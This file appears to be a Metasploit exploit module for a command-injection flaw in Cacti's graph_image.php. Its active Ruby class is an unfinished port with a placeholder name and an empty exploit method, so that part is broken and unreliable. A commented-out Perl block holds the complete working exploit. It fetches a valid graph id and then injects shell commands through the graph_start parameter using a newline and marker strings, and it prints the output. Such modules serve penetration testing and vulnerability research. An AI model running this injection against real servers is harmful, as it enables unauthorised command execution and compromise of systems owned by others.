require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Cacti graph_image.php Remote Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution
				vulnerability in the Raxnet Cacti 'graph_image.php' script.
				All versions of Raxnet Cacti prior to 0.8.6-d are
				vulnerable.
					
			},
			'Author'         => [ 'David Maciejak <david dot maciejak at kyxar dot fr>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '14042'],
					[ 'MIL', '96'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 128,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jun 23 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cacti_graphimage_exec;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'Cacti graph_image.php Remote Command Execution',
	'Version'  => '$Revision$',
	'Authors'  => [ 'David Maciejak <david dot maciejak at kyxar dot fr>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'DIR'   => [1, 'DATA', 'Directory of cacti', '/cacti/'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in the
	Raxnet Cacti 'graph_image.php' script. All versions of Raxnet Cacti prior to 
	0.8.6-d are vulnerable.
}),
	'Refs' =>
	  [
		['BID', '14042'],
		['MIL', '96'],
	  ],

	'Payload' =>
	  {
		'Space' => 128,
		'Keys'  => ['cmd','cmd_bash'],
	  },

	'Keys' => ['cacti'],

	'DisclosureDate' => 'Jun 23 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $cmd            = $encodedPayload->RawPayload;

	
	$cmd = $self->URLEncode($cmd);
	
	my $listgraph = $dir.'graph_view.php?action=list';
	my $requestlist =
	  "GET $listgraph HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: ".$self->VHost.":$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target to get list of valid image id ...");

	$s->Send($requestlist);

	my $resultslist = $s->Recv(-1, 20);
	$s->Close();
	
	$resultslist=~m/local_graph_id=(.*?)&/ || $self->PrintLine("[*] Unable to retrieve a valid image id") && return;
	
	my $valid_graph_id=$1;

	$dir = $dir.'graph_image.php?local_graph_id='."$valid_graph_id".'&graph_start=%0aecho;echo%20YYY;'."$cmd".';echo%20YYY;echo%0a';

	my $request =
	  "GET $dir HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: ".$self->VHost.":$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	$s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target to execute command ...");

	$s->Send($request);

	my $results = $s->Recv(-1, 20);

	if ($results=~ /^transfer-encoding:[ \t]*chunked\b/im){

		(undef, $results) = split(/YYY/, $results);

		my @results = split ( /\r\n/, $results );

		chomp @results;

		for (my $i = 2; $i < @results; $i += 2){
			$self->PrintLine('');
			$self->PrintLine("$results[$i]");
		}
	} else {

		(undef, $results) = split(/YYY/, $results);

		my @results = split ( /\r\n/, $results );

		chomp @results;
		$self->PrintLine("[*] Target may be not vulnerable");
		$self->PrintLine("$results");
	}

	$s->Close();
	return;
}

sub URLEncode {
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

sub VHost {
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

1;

=end


end
end	
